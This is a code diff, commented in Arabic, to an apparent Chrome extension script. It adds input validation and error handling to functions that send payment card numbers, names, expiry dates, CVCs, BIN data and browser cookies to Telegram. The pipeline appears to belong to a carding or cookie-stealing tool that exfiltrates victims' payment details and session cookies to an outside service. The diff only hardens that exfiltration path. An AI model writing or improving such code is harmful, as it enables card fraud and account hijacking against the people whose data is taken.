@@ -213,6 +213,27 @@ async function sendToTelegram(data) {
         }, retryAfter * 1000);
       }
       
+      // التعامل مع خطأ بيانات غير صحيحة
+      if (result.code === 'TELEGRAM_BAD_REQUEST') {
+        console.error('❌ بيانات غير صحيحة لإرسالها إلى تليجرام:', result.details);
+        
+        // عرض تنبيه للمستخدم
+        chrome.notifications.create({
+          type: 'basic',
+          iconUrl: 'icon48.png',
+          title: 'خطأ في البيانات',
+          message: 'بيانات غير صحيحة، تم تجاهل الرسالة'
+        });
+        
+        // لا نحاول إعادة الإرسال لأن المشكلة في البيانات نفسها
+        return { 
+          success: false, 
+          error: 'بيانات غير صحيحة لإرسالها إلى تليجرام',
+          code: 'TELEGRAM_BAD_REQUEST',
+          details: result.details 
+        };
+      }
+      
       // التعامل مع عدم توفر تليجرام
       if (result.code === 'TELEGRAM_UNAVAILABLE') {
         const retryAfter = result.retryAfter || 120;
@@ -295,13 +316,23 @@ async function sendToTelegram(data) {
 
 // دالة إرسال بيانات البطاقة
 async function sendCardData(cardData) {
+  // التحقق من صحة البيانات
+  if (!cardData || typeof cardData !== 'object') {
+    console.error('❌ بيانات البطاقة غير صحيحة:', cardData);
+    return { 
+      success: false, 
+      error: 'بيانات البطاقة غير صحيحة',
+      code: 'INVALID_CARD_DATA'
+    };
+  }
+  
   const data = {
     type: 'card',
     message: {
-      number: cardData.number,
-      name: cardData.name,
-      expiry: cardData.expiry,
-      cvc: cardData.cvc
+      number: cardData.number || '',
+      name: cardData.name || '',
+      expiry: cardData.expiry || '',
+      cvc: cardData.cvc || ''
     }
   };
   
@@ -310,14 +341,24 @@ async function sendCardData(cardData) {
 
 // دالة إرسال بيانات BIN
 async function sendBinData(binData) {
+  // التحقق من صحة البيانات
+  if (!binData || typeof binData !== 'object') {
+    console.error('❌ بيانات BIN غير صحيحة:', binData);
+    return { 
+      success: false, 
+      error: 'بيانات BIN غير صحيحة',
+      code: 'INVALID_BIN_DATA'
+    };
+  }
+  
   const data = {
     type: 'bin',
     message: {
-      pattern: binData.pattern,
-      name: binData.name,
-      cardNumber: binData.cardNumber,
-      expiryDate: binData.expiryDate,
-      cvc: binData.cvc
+      pattern: binData.pattern || '',
+      name: binData.name || '',
+      cardNumber: binData.cardNumber || null,
+      expiryDate: binData.expiryDate || null,
+      cvc: binData.cvc || null
     }
   };
   
@@ -326,11 +367,21 @@ async function sendBinData(binData) {
 
 // دالة إرسال Cookies
 async function sendCookiesData(cookiesData) {
+  // التحقق من صحة البيانات
+  if (!cookiesData || typeof cookiesData !== 'object') {
+    console.error('❌ بيانات Cookies غير صحيحة:', cookiesData);
+    return { 
+      success: false, 
+      error: 'بيانات Cookies غير صحيحة',
+      code: 'INVALID_COOKIES_DATA'
+    };
+  }
+  
   const data = {
     type: 'cookies',
-    message: cookiesData.message,
-    url: cookiesData.url,
-    cookies: cookiesData.cookies
+    message: cookiesData.message || '',
+    url: cookiesData.url || '',
+    cookies: cookiesData.cookies || ''
   };
   
   return await sendToTelegram(data);
@@ -338,6 +389,16 @@ async function sendCookiesData(cookiesData) {
 
 // دالة إرسال رسالة عادية
 async function sendMessage(message) {
+  // التحقق من صحة الرسالة
+  if (!message || typeof message !== 'string') {
+    console.error('❌ رسالة غير صحيحة:', message);
+    return { 
+      success: false, 
+      error: 'رسالة غير صحيحة',
+      code: 'INVALID_MESSAGE'
+    };
+  }
+  
   const data = {
     type: 'message',
     message: message
